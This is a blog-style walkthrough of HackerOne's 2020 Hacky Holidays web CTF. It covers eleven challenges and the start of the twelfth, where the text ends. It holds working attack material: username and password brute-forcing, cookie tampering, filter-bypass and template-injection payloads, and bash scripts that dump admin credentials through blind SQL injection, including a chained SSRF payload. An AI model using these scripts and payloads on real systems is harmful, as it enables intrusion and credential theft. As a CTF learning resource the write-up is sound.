---
title: Hacky-Holidays. A Tale of Saving The Holidays
author: 
date: 2021-01-15 21:00:00 +0500
comments: false
categories: [Categories, CTF-Challenges]
tags: [ctf, cyber security]
---

__Assalam-o-Alaikum & Hello Folks!__ 

I hope you are doing well.
Today I am here with the detailed writeup of a ctf organized by [Hackerone](https://www.hackerone.com) which started in 2nd week of December 2020. It was a 12 days long CTF called [Hacky-Holiday](https://www.hackerone.com/resources/hackerone/12-days-of-hacky-holidays-ctf). There were total of 12 different challenges all focused on Web Applications. Each day a new challenge was available to solve.

Lets get started:

# Day 01

## Information Gathering

![Day-01](/assets/img/posts/hackyholiday2020/day1/day-01-1.png)

* The main page did not had anything interesting. 
* I checked the source code, but found nothing useful. 

## Hunting the flag
1. Out of ideas, I ran directory brutforce using dirsearch:
    ```Bash
    dirsearch -u https://hackyholidays.h1ctf.com/ -e html,php
    ```
    Found **`robots.txt`** file. That file disclosed the flag and the hint for next challenge. That was easy right?

![IMAGE](/assets/img/posts/hackyholiday2020/day1/day-01-2.png#center)

___
# Day 02

As I got the hint from the day 01 task, I visited the **s3cr3t-ar3a** page.

![IMAGE](/assets/img/posts/hackyholiday2020/day2/day-02-1.png)

## Information Gathering

* As usual, when there is nothing much to interact with, first thing I do is to check the source code. 
* I noticed there was a div element having an id of **`alertbox`**, nothing interesting.
* There was also a jquery file added to this html document.
  
  ![IMAGE](/assets/img/posts/hackyholiday2020/day2/day-02-2.png)

## Hunting the flag

1. I opened that jquery file and started giving a birds eye view to it. There I found that **`alertbox`** id.  

![IMAGE](/assets/img/posts/hackyholiday2020/day2/day-02-3.png)

1. If we look closely, there is an attribute **`data-info`**, some variables are being concatenated to it and these variables are defined just above.

1. If we evaluate that **data-info** attribute, the end result is the flag

**NOTE:** Reading this code, I also realized that if I had used developer tools (inspect element), the flag would have been there, so I did not need to read that jquery file for figuring out the flag.

___
# Day 03 - People Rater

## Information Gathering

The application had a list of names, if we click the name, we get a pop up showing the rating of that person.

![IMAGE](/assets/img/posts/hackyholiday2020/day3/day-03-1.png)

* At the main page we can see different people'e rating which is given by the evil grinch! Upon reading the source code I found some endpoints.

 ![IMAGE](/assets/img/posts/hackyholiday2020/day3/day-03-2.png)

* We can see two interesting endpoints here: 
   * `/people-rater/entry?id=`  
   * `/people-rater/page/`.

    we need to find the ids for the `/entry?id=` endpoint. 
* Reading the script shows that the `/people-rater/page/` has incremental integer values so visiting `/people-rater/page/1` give us the following content back:
 
 ![IMAGE](/assets/img/posts/hackyholiday2020/day3/day-03-3.png)

* If we enter any id from above response to the `/entry?id=` endpoint, we get a json response containing the name and rating of that person. 

* So we have the ids now, and also an endpoint which takes an id value in its `id` parameter. 

## Hunting the flag
 
1. The id was not numeric, it was in some encoded form. I tried to see if I could decode the id value. It turned out the value was **based64** encoded.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day3/day-03-4.png)

1. So the first id was 2! But who has the id **`"1"`** then? I simply converted the `{"id":1}` value to base64 and visited the following endpoint:
 `/people-rater/entry?id=eyJpZCI6MX0=`. Note that the value **`eyJpZCI6MX0=`** is base64 encoding of **{"id":1}**

In response, we can see the flag.

 ![IMAGE](/assets/img/posts/hackyholiday2020/day3/day-03-5.png) 

 ___
 # Day 04 - Swag shop

The task was to get the personal details  of Grinch from an online shop.
The shop had some swags, but to make a purchase, we need to login. I tried to find out but there was no register page.

![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-1.png)

## Information Gathering

* If we check the source code, we could see some Jquery code at the end. 
  
  ![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-2.png)


* This code disclosed some of the important endpoints which were: 
  * `/api/stock` 
  * `/api/login`

* Knowing that, maybe there are more endpoints for this `/api` path, so we can do a simple directory fuzz and find out that there were two more endpoints: 
  * `/api/user` 
  * `/api/sessions`
  
   ```
    dirsearch -u https://hackyholidays.h1ctf.com/swag-shop/api/ -e php,html
  
   ```
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-3.png)

* Visiting `/api/user` endpoint, we get an error in response saying: **"Missing required fields"**. So this endpoint requires some parameter(s),and we need to find those parameter(s).

* I ran a tool [ARJUN](https://github.com/s0md3v/Arjun) against this endpoint (Arjun is HTTP Parameter Discovery Suite) and it turns out the endpoint can have a **uuid** parameter.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-7.png)

* Visiting the `/api/sessions` endpoint, we get an array of base64 encoded sessions in response.
  
  ![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-4.png)

So we have an `/api/user` endpoint, which accepts an `uuid` parameter. We need to get some `uuids` to use the `/api/user?uuid=` endpoint. Also we have some base64 encoded sessions too.

## Hunting the Flag

1. I decoding all the base64 sessions, and only one of them had some Id value in it.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-6.png)

2. So I took that Id value and used in the `/api/user?uuid` endpoint. In response we get the flag!

    ```
    https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043`
    ```

    ![IMAGE](/assets/img/posts/hackyholiday2020/day4/day-04-8.png)

___
# Day 05 - Secure Login
The task was to find the flag by accessing the secret area. The main page had only a login form. 

![IMAGE](/assets/img/posts/hackyholiday2020/day5/day-05-1.png)

## Information Gathering

* There was nothing important in source code nor did I found any useful directories. 
* If we try to enter some random username and password, the response is <span style="color:red">**Invalid Username**</span>.
* Such error are bad practise as they can be used to facilitate the enumeration process for username and passwords using bruteforce attack.
* So using this error, we can determine when we enter a valid username (as when we will enter the valid username, we won't get this error) and password.

## Hunting the flag

1. I sent the login request again, intercepted using burp suite & sent the same request to intruder. Selected only the username field to enumerate(making the password field constant).
2. The attack type of Intruder was **Sniper**, I loaded a simple username wordlist from Seclist. In the **Options** tab, I added a `Grep-Match` rule of **"Invalid Username"**. This rule will help to identify the valid username.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day5/day-05-01.png)

3. Now start the attack. Thanks to the grep rule I added above, the valid username will have an unchecked box against it (because it does not have the **Invalid Username** in reponse, but **Invalid Password** because that specific username is correct).
4. Repeat same procedure for finding the password, in the intruder tab, enter the valid username that we just found, select password field to enumerate, then instead of using **Invalid Username** in Grep-Match, use **Invalid password**. Also use a password wordlist (I used SecList again)
5. The username and password found were **`acess`** & **`computer`** respectively. After login, we can't see anything useful yet.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day5/day-05-3.png)

6. Upon anaylzing the cookie, it turned out it is base64 encoded. It had an object **admin** with value of **false**. I Changed the false value to true, base64 encode the value again and then replaced the cookie.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day5/day-05-5.png)

Now I had a zip file that can be downloaded.The file was password protected, so I used JTR (John The Ripper) to crack the password.

1. For this, first I got the hash of the downloaded file (using zip2john) and stored it into a file and then used JTR to crack the hash.

    ```bash
    > zip2john my_secure_files_not_for_you.zip > zip-hash.txt

    > john zip-hash.txt 
    ```

    ![IMAGE](/assets/img/posts/hackyholiday2020/day5/day-05-7.png)

The password was `hahahaha`. The zip file had a flag.txt file containing 
the flag.
___
# Day 06 - My Diary
The task was to hack the Grinch's personal diary to find out his secret event. 

![IMAGE](/assets/img/posts/hackyholiday2020/day6/day-06-1.png)

## Information Gathering

* If we see the main page, it has following url: 
  
  `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`

* Whatever we enter after `/my-diary/`, it gets redirected to `?template=entries.html`.

* A simple directory fuzz outputs a `/my-diary/index.php` file. Accessing the file simply redirect to the `?template=entries.html`.

* In the url, Replaced the **entries.html** with **index.php** and we get a blank page. But checking the source code reveals some php code.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day6/day-06-2.png)


## Hunting the flag

1. The code says that there is `secretadmin.php` file. But there are some filters applied such that if the user input contains the word `admin.php` it gets converted to empty string. Then after that check, the code checks if the remaining input contains the word `secretadmin.php` and replaces it with empty string again.

    So the task here was to enter such a payload that even afer the filters, the last output is `secretadmin.php`.

2. After a lots of tinkering and coming up with different payloads, the following payload worked in this scenario: **`secretadminsecretadminadmin.php.php.php`**

    ![IMAGE](/assets/img/posts/hackyholiday2020/day6/day-06-3.png)

    ![IMAGE](/assets/img/posts/hackyholiday2020/day6/day-06-4.png)

___
# Day 07 - Hate Mail Generator

## Information Gathering

* The application has the functionality of: 
  * Creating new mails 
    * We can also preview the new mail before we can actually create it
  * Viewing the existing mails

    ![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-1.png)

* while reading the existing mail, we could see that **`template literals`** are being used in the Markup field. 
* It means when the code is being executed, the files referenced in that template literal will be loaded & display the content it has (here we have **cbdj3_grinch_header.html/footer.html**)

    ![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-2.png)

* Simple directory fuzzing reveals the `templates` directory which contains all the available templates, including one which belongs to Admin!
Directly accessing the files returns an error that we can't access them directly.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-3.png)

*  On the create new mail page, if we click the preview button before creating the mail, we get the following content in response always (irrespective of what we enter in any input field):

    ![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-4.png)

    **Interesting!**

## Hunting the flag
   
1. Upon checking the source code of this page (create new mail), I found that there are two hidden elements. One with the value of `Hello {{name}}` and the second with the value of `{"name": "Alice", "email": "alice@test.com"}`.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-5.png)

3. So the name object from second element is getting placed in the first element by using template literal. I simply changed the value of `"name"` object to `"38dhs_admins_only_header.html"`

    ![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-6.png)

In the response, I got the flag.

![IMAGE](/assets/img/posts/hackyholiday2020/day7/day-07-7.png)

___
# Day 08 - Forum

![IMAGE](/assets/img/posts/hackyholiday2020/day8/day-08-1.png)


The task was to read the admin posts which are only visible to admins. There is a login function, but no way to register an account.

## Information Gathering

* The app was quite simple as we can only read the public posts.
  * Though those posts shows that there are at least two users already in the application namely **`grinch`** (probably the admin) and **`max`**.

* Directory fuzzing revealed that there was a directory named: `phpmyadmin`. I tried some common/default username & password combinations but were of no use.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day8/day-08-2.png)


## Hunting the flag

1. Quite confused at this point, I started checking what other people are taking about this challenge, there was a hint that said `Its on the Internet!`
   
2. A simple google search `Grinch Networks github` and I can see Adam Langley's github profile (Creator of this CTF). There I found the source code for this **Forum**' Application. At first, there was nothing important in the latest commit, so I tried to read the initial commits.
3. In the second commit, the file `db.php` had the username and password for that phpmyadmin client!

    ![IMAGE](/assets/img/posts/hackyholiday2020/day8/day-08-3.png)

4. Logged in into phpmyadmin client using **username:`forum`** & **password:`6HgeAZ0qC9T6CQIqJpD`**. There we can only access the users table which had the username, password (hashed) and whether the user is admin or not.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day8/day-08-4.png)

5. I took the password hash, and used [CrackStaion](https://crackstation.net/) to crack the password. The password was **`BahHumbug`**.
    * I tried quite a lot other online services but nothing worked for me.
    * I even tried using JTR with rockyou.txt wordlist but even that did not cracked the password.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day8/day-08-5.png)

6. Used the username `grinch` and password `BahHumbug` to login to the main forum application.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day8/day-08-6.png)

___
# Day 09 - Evil Quiz

In the Evil Quiz application, a user, after entring his name, can attempt a quiz, and based on his anwers, the application rates the user's evilness on scale of 1 to 3.

The app also has Admin login panel.

![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-1.png)

## Information Gathering 

After spending some time using the application, these are some important information I got:

* The user has to follow the following workflow to complete the whole quiz process:
  * Enter Name
  * Attempt Quiz
  * Get the results back on the `score` page
* The `Name` is shown on the score page.
* `Score` page also shows number of users that have same Name as mine!
* After a little tinkering I found that even if I enter very random and gibberish Name, there is aways at least one more person having same Name. 
  
  That is interesting right?

    ![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-2.png)

This gives a little idea that maybe we have to play with the Name parameter, as I did not found anything interesting/suspicious other than this behaviour.

* Then I entered the gibberish name like above, but added apostrophe **`'`**, this time the output showed that **there are 0 players with same name is this one**. To confirm the behaviour, I entered a common name like `admin` and added an apostrophe like **`admin'`**, the output was again that **there are 0 players with same name is this one**.
* At this stage, trying for SQLi, I entered the following payload in Name field:
  * **`' AND false #`**
    * Output: There is 0 other player(s) with the same name as you!
  * **`' AND true #`**
    * Output: There is 1195799 other player(s) with the same name as you!

![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-3.png)  ![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-4.png)

So at this point, we know that we have boolean based SQLi, the truthy statement return a very big number of players, while a false statement return 0 number of players!
Having all above information, we can try payloads that are either true or false, this way we can get the information from the DB.

Our goal here is to retrieve information from DB, that enable us to login to admin panel, so maybe `username` & `password` of admin user?

Lets abuse this vulnerability!

## Hunting the flag

1. First thing I did was to check which tables exists in the DB, the first two table name that came to my mind were `admin` and `users`. So I used following payload to check the length of 1st table:

   `' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 #
`

    So first I am using a **SELECT** statement to get the first table from current DB, then using **length** function, I am checking if the length of table's name is **5** (admin has length 5). The output on the `Score` page showed a large number of players, indicating the table name is indeed 5 characters long.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-5.png)

1. We got the length, but this does not mean the name is indeed `admin`, it only means that whatever the name of table is, it is 5 character long. So we need to check each character to see what the name of table is. For this, I used the following payload:

    `' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) = 97 # 
`

    First I am **SELECT**ing the first table of current DB, then using **substr** function, I am just selecting the first character of that table (note the `1,1`), in the end, I am converting that character to ascii (decimal form) and comparing if it is `=` to `97` (`97` in decimal means `a`). The output showed that indeed this statement is true, so first character (out of 5) of our table is **`a`**.

1.  So in this way, we can now select the second character using `substr(QUERY-THAT-RETURNS-TABLENAME,CHAR-NUMBER,1)` function, convert it to ascii and compare with decimal numbers from `97 to 122` (a-z). And repeat this step for the remaining characters.
    
    `' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,2,1))) = 100 #`

    (100 for **`"d"`**, output shows it is true as well) Following above steps, I found out the table name was indeed `admin`.

2. Now we have the table name, time to find out the column names. Here I did not really enumerated for the column names as I was quite sure that there will be `username` & `password` columns here.
3. Just as we found the table name, I used same steps to find the length of actual values (first row) of culumn `username` and `password`.
   
   ```
    => ' AND (length((select username from admin limit 0,1))) > 5 #  //false
    => ' AND (length((select username from admin limit 0,1))) = 5 #  //true

    => ' AND (length((select password from admin limit 0,1))) > 5 //true
    => ' AND (length((select password from admin limit 0,1))) > 10 //true
    => ' AND (length((select password from admin limit 0,1))) > 15 //true
    => ' AND (length((select password from admin limit 0,1))) > 20 //false
    => ' AND (length((select password from admin limit 0,1))) = 17 //true
   ```
4. So we have username with length **`5`** and password with length **`17`**. We can use a script to automate the whole process and find the username and password. I made a script which does the job, just following the steps like step 2 to step 3. After completion, this script outputs the usernamen/password in decimal form so we  need to convert it back to characters (decimal to string)
   
   **Script that finds the username**
   ```bash
    userNameLength=5;
    asciUser="";
    asciCode=97;
    for((i=1;i<=$userNameLength;i++)); do
        echo "Checking char $i aginst Ascii code:- ";
        while [ 1 ]; do
            echo -n "$asciCode ";
            query="' AND (ascii(substr((select username from admin limit 0,1) ,$i,1))) = $asciCode # ";
            cookie=$(curl -i -s "https://hackyholidays.h1ctf.com/evil-quiz" | grep session= | cut -d= -f2 | cut -d\; -f1);
            curl -i -s -k -X "POST" -b "session=$cookie" --data-binary "name=$query" "https://hackyholidays.h1ctf.com/evil-quiz" > /dev/null
            iscorrect=$(curl -i -s -L -X "POST" -b "session=$cookie" --data-binary "ques_1=0&ques_2=0&ques_3=0" "https://hackyholidays.h1ctf.com/evil-quiz/start" |  grep "There is" | cut -d \> -f2 | cut -d " " -f3);
            if [ $(echo $iscorrect) = 0 ]; then
                
                ((asciCode=asciCode+1));
                if [ $(echo $asciCode) = 123 ]; then
                    break;
                fi

            else
                echo -e "\n=> POSITION $i CHAR HAS ASCII CODE: $asciCode";
                asciUser+=$asciCode;
                asciUser+=" ";
                asciCode=97;
                break;
            fi

        done
    

    done

    echo -e "++++ USERNAME IN DECIMAL IS: $asciUser ++++";

   ```
    ![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-6.png)

    Scripts says the username is: **97 100 109 105 110**, which is **`admin`**.

    Similarly, Used quite similar script to find out the password.
    The password was **`S3creT_p4ssw0rd-$`**

    ```bash
    passwordLength=17;
    asciPass="";
    asciCode=32;
    for((i=1;i<=$passwordLength;i++)); do
        echo "Checking char $i aginst Ascii code:- ";
        while [ 1 ]; do
            echo -n "$asciCode ";
            query="' AND (ascii(substr((select password from admin limit 0,1) ,$i,1))) = $asciCode # ";
            cookie=$(curl -i -s "https://hackyholidays.h1ctf.com/evil-quiz" | grep session= | cut -d= -f2 | cut -d\; -f1);
            curl -i -s -k -X "POST" -b "session=$cookie" --data-binary "name=$query" "https://hackyholidays.h1ctf.com/evil-quiz" > /dev/null;
            iscorrect=$(curl -i -s -L -X "POST" -b "session=$cookie" --data-binary "ques_1=0&ques_2=0&ques_3=0" "https://hackyholidays.h1ctf.com/evil-quiz/start" |  grep "There is" | cut -d \> -f2 | cut -d " " -f3);
            if [ $(echo $iscorrect) = 0 ]; then
                
                ((asciCode=asciCode+1));
                if [ $(echo $asciCode) = 123 ]; then
                    break;
                fi

            else
                echo -e "\n=> POSITION $i CHAR HAS ASCII CODE: $asciCode";
                asciPass+=$asciCode;
                asciPass+=" ";
                asciCode=32;
                break;
            fi

        done
        
    done

    echo -e "++++ PASSWORD IN DECIMAL IS: $asciPass ++++";
    ```

5. Went to Admin login section, using the found username `admin` and password `S3creT_p4ssw0rd-$`, got the flag!
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day9/day-09-7.png)

___
# Day 10 - Signup Manager

The main page had two functions, Login and Signup. After I created an account, I was just greeted with a message saying `We'll have a look into you and see if you're evil enough to join the grinch army!`.

## Information Gathering

![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-1.png)

* Checking the source code revealed that there is an `README.md` file.
   I visited the url `https://hackyholidays.h1ctf.com/signup-manager/README.md`. The file got downloaded and it has some really sensitive information!

   ![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-2.png)

  * The 2nd point suggests that there is a signupmanager.zip file in the directory, Which was true. Downloaded the file from the url `https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`. it had the files namely **index.php, user.php, admin.php,signup.php**.
  
  * The 6th point tells us that in the `users.txt` file (where details of all users are stored), if we change the last character to **`Y`**, that specific users will become admin!

* After checking each file, only the `index.php` seems interesting. Reading the code revealed the information about how the new user is created and how the input values are handled.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-3.png)

* The `addUser()` function takes the input values (from signup form), converts the 
   * **username,firstname and lastname** values to 15 characters length (by padding the # char), if the user input size is less than 15. 
   * **password & radnom_hash** variables to md5-hashes (this converts both to 32 characters each as md5 hash has length of 32).
   * **Age** parameter into 3 characters length if the user input size is less than 3.
   
        There is also a empty string and in the end of this whole concatenated string, a value **`"N"`** is concatenated. In the end, only the first 113 characters are added to users.txt file which contains all the user's information.

* The `buildUser()` function reverse this whole `padding process`, and in the end checks if the last value i.e the **`113th`** character is **`"Y"`** or **`"N"`**. If it is **`"Y"`** then the user is admin otherwise not admin.
   
Analyzing all the information we have, if we can send such an input which makes the 113th character to be `"Y"` instead of `"N"`, then our new created account will have admin privileges.


## Hunting the flag


1. After spending a lots of time and testing each input to see if I could abuse any functionality, I could not find any. Exchanging ideas with a few participants helped quite a lot and I decided to focus more on the `age` parameter, as it was going through multiple functions. 
   
    ![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-4.png)

2. So there were two checks, first to ensure that the input is numeric, and second to ensure that length of input is not more than 3. Also note that after all these checks, in the end the age value is casted to integer type using that **`intval()`** function.
   
    * Doing a simple google search about the `is_numeric` function and checking the doumentaion page revealed something of interest!

    ![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-5.png)

    * Can you spot what could be more important for our scenario?
    * There is a value **`1337e0`** and documentaion says that it is numeric. Here `e` means exponent.

   * This function is not vulnerable itslef, but the way it is used in this context caused a logical vulnerability. I had to come up with such a value for `Age`, that itslef it is max 3 chars long, and it is numeric in type too, but once converted to integer, its length increases.
  
3. Entering an exponential value here causes the real issue like `1e3` (which is 1000 in integer form). The `intval()` in the end converts the `1e3` into `1000` thus bypassing the above checks and uploading a value greater than 3 chars!.
   
   ![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-6.png)

4. So now we can control the total lenght of that string which is generated in the `addUser()` function. All we have to do is to send the age value of length `4` and for the last input field i.e `lastname`, its `15th` char must be **`Y`**. This way, when the `addUser()` function adds the value **`N`** in the last, it will be **`114th`** char and the **`Y`** will be at **`113`** position!
   
   I used the following values:
   * username=`197IQ`, password=`maga2020!`, age=`1e3`,firstname=`Elite`, lastname=`HaxorWith197IQY`
   * Not the `Y` as the 15th char (last char) in lastname field.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-7.png)

Upon this,the new user is actually an Admin now and we can access the flag!

![IMAGE](/assets/img/posts/hackyholiday2020/day10/day-10-8.png)

___
# Day 11

## Information Gathering
![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-1.png)

After checking the application, i got the following important endpoints:

* /attack-box/login
* /album?hash=6-CHAR-HASH
* /picture?data=BASE64-ENCODED-DATA
* /api

The `/attack-box/login` is simple login form, nothing else.


The `/album?hash=` endpoint takes 6 character string (a hash maybe) and displays the content it contains.

The images url was quite interesting as they were fetched from `/picture?data=` endpoint, where tha values for **data** parameter were `base64` encoded.
I decoded the value and the value was in the form of :
`{"image":"r3c0n_server_4fdk59\/uploads\/HASH.jpg", "auth":"HASH"}`

![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-3.png)

So the `"image"` object contains the path to resource (in this case the image) & `"auth"` object contains the hash for that specific image that is generated by the server somehow.

The `/api` endpoint showed meaning of the status code it returns and also a message saying the api is being developed right now.

![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-2.png)

Visiting any endpoint after `/api/`, like `/api/user` returns the following response: `{"error":"This endpoint cannot be visited from this IP address"}`

This indicates that there must be another way of accessing these endpoints.

Coming back to the `/picture?data=` endpoint, I noted that for each different picture, the **auth** value is different and if we try to change/replace the auth/image with another image's data, or we change even the path from **uploads** to something else, we get the message  `invalid authentication hash` in response. So what this mean is that, for every image or path (like `/uploads`), a different **auth** hash is generated and they are bind together.

After this information gathering phase, we have some valuable information:
  
* We can't directly visit `/api/ANYTHING` endpoint, so there must be another way around, probably **SSRF**!
* This potential **SSRF** can be achieved if we can make the **image** object (from that base64 encoded data for `/picture?data=` endpoint) to access the `/api` endpoint.
* But to achieve this, we will have to generate a valid **auth** hash for any endpoint, that we want the **image** object to access.
* So we need to find a way to generate the **auth** hash for a successful **SSRF**

So trying to find the way to generate the hash ... wait! Did I say hash?

We have not talked about the `/album?hash=` endpoint. Well as I said earlier, I was collaborating with two amazing hackers. One of them really helped in this challenge. He was able to find that the **hash** parameter is vulnerable to boolean-based sql injection.

So now lets see the steps to do all the above mentioned tasks to solve this challenge.

## Hunting the flag

1. Running sqlmap against the `/album?hash=` endpoint shows that this is actually boolean-based sql injectable.
   ```bash
    python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump
   ```

    ![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-4.png)    ![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-5.png)

2. This shows that we have three columns namely **id**, **hash** & **name** for the `album` table. So the first column (**id**) is responsible for loading the pictures from `picture` table.
3. Here if we can manipulate the column `photo` of table `photo` and change it to the path like `/api/user` then the server will also generate the `auth` hash for that particulat endpoint/path.
4. Considering this in mine, To select columns of `photo` table we can use double UNION query.
5. Here is the final request that I used to generate the hashes for custom paths:

    `%27UNION%20SELECT%20"%27UNION%20SELECT%20NULL,NULL,%27../api/user%27%23",null,null%23`

    Lets break down this query:

    * First `SELECT` is being used to select the 3 culumns of `album` table which are **id, hash, name**.
    * In the first column (**id**) I am using another `SELECT` to select the 3 columns of `photo` table which are **id, album_id, photo**.
    * Our concern is only with the `photo` column as its values are being used in our `image` object (remember the base64 encoded payload that we decoded!). So what we want here is to change the value of the `photo` column to the path where we want to send the request (basically the request will be made by server itself as we will use this value in the `image` object ... SSRF!)
    * So to achieve this in the second `SELECT` statement, I used NULL for first two columns, and then the path we want to send the request to, in this case it was `/api/ANY-ENDPOINT`
    * The server will generate a valid `auth` hash for us automagically.

6. After sending the above sql payload in `?hash=` parameter, we get an image in response that has our required data! We can confirm this by decoding the value.

    ![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-6.png)

    ![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-7.png)

### Finding Valid endpoints and their parameters

1. We can generate the hashes, and we can make the server send request on our behalf, Cool!
2. Now if we query the `/api/*` endpoint, the response was not the previous error, which means now we can enumerate this api for valid endpoints.
3. Now any request that I sent to `/api/*` endpoint the response was always: `"Expected HTTP status 200, Received: 404"`. Which indicates the request is successful, but the resource/endpoint does not exists.
4. Did a little enumeration here, when I sent the request to `/api/user` the response changed to: `"Invalid content type detected"`. This indicates that this is a valid endpoint.
5. Next step was to find the valid parameters, which was quite straight forward as sending the request to `/api/user?username` & `/api/user?password`
   had the response: `"Expected HTTP status 200, Received: 204"`, and for anyother parameters the response was `"Expected HTTP status 200, Received: 400"`.

### Get valid username and password

1. We have the valid parameters, now we need to find their values. The request for this purpose was as follows: 
   
   https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27UNION%20SELECT%20"%27UNION%20SELECT%20NULL,NULL,%27../api/user?username=%%27%23",null,null%23 

   **Note that extra "%" after "username=", the % in sql replaces any number of characters - equivalent to '*' in Linux/Unix**

2. First I tried to find the username, and I sent two names, **admin & grinch**. Response for **admin** (or any other value) was `"Expected HTTP status 200, Received: 204"` but for **grinch** it was `"Invalid content type detected"` indicating its correct. To make sure if its the correct username, simply remove the **"%"** after username and if the response is still `"Invalid content type detected"` this means the username is correct otherwise there are more characters to this username.
3. The response was `"Expected HTTP status 200, Received: 204"` which means we have to find the remaining characters of this username. So to do that, I wrote a bash script which does checks for the valid characters and in the end prints out the complete username. Here is the script that I wrote:

    ```bash
    user="grinch";
    check=0;
    cont=1;
    while [ $(echo $cont) == 1 ]; do
	    check=0;
	    for char in $(cat $1)
		do
			curl -s "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27%20UNION%20SELECT%20%22%27%20union%20select%201,2,%27../api/user?username=$user$char%25%27%23%22,null,null%23" > response.txt; 
			hash=$(cat response.txt | grep data= | cut -d "?" -f2 | cut -d = -f2 | cut -d \" -f1 | tail -n 1)
			curl -s -i "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=$hash" > final.txt
			tail -n 1 final.txt	 | grep "Invalid content type detected" > gotit.txt
            echo -n "$char ";
			if [ -s gotit.txt ]; then
				echo -e "\nValid character found : $char"
				user+=$char
				check=1;
                rm gotit.txt
				break
			fi
			
		done
		
		if [ $(echo $check) != 1 ]; then 
			cont=0 
		fi

    done
    echo -e "\nUSERNAME : $user" 
    ```
    This script takes just a wordlist of chars ( my wordlist was containing the following characters: `[a-z,A-Z,0-9,!@$]`) and check which are valid.
    The script showed that username is **`grinchadmin`**

    ![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-8.png)

4. We found the username, now its time for password, which is quite straight forward now. I simply altered the above script and found the valid password too!

    ```bash
    pass="";
    check=0;
    cont=1;
    while [ $(echo $cont) == 1 ]; do
	    check=0;
	    for char in $(cat $1)
		do
			curl -s "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27%20UNION%20SELECT%20%22%27%20union%20select%201,2,%27../api/user?username=grinchadmin%26password=$pass$char%25%27%23%22,null,null%23" > response.txt; 
			hash=$(cat response.txt | grep data= | cut -d "?" -f2 | cut -d = -f2 | cut -d \" -f1 | tail -n 1)
			curl -s -i "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=$hash" > final.txt
			tail -n 1 final.txt	 | grep "Invalid content type detected" > gotit.txt
			echo -n "$char "
			if [ -s gotit.txt ]; then
				echo -e "\nValid character found : $char"
				pass+=$char
				check=1;
				rm gotit.txt
				break
			fi
			
		done
		
		if [ $(echo $check) != 1 ]; then 
			cont=0 
		fi

    done
    echo -n "PASSWORD : $pass"
    ```

    The password it found was: **`s4nt4sucks`**

Now I went to `/attack-box/login` and used the found username and password to login. Success!

![IMAGE](/assets/img/posts/hackyholiday2020/day11/day-11-9.png)

___
# Day 12 - The day when we saved the holidays

The day all the hackers were waiting for, to get a chance of stopping the grinch from ruining the holidays!

![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-1.png)

## Information Gathering

* The application had very limited user interaction. There were 3 targets (Ip addresses). Clicking the **Attack** button launches the DOS attack against that IP address.
  
  ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-2.png)

* The url was interesting as we have an endpoint `/launch?payload=BASE64-ENCODED-VALUE`
  
  ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-3.png)

* Decoding the payload value, we get the data in following format:
  
  `{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}`

  ![IMAGE](/assets/img/posts/hackyholiday2020/day12/day-12-4.png)

* So quite similar to the previous challenge right? If I chnange the IP address in `target` object, we get an error `"Invalid Protection Hash"`.

